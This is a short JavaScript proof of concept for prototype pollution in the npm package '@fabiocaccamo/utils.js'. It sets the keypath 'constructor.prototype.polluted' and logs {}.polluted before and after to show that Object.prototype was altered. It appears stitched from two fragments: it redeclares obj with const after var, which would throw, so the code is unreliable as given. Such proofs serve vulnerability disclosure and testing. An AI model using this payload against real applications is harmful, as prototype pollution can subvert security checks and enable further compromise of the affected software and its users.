var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const utils = require('@fabiocaccamo/utils.js');
const obj = {};
console.log({}.polluted);
utils.object.keypath.set(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);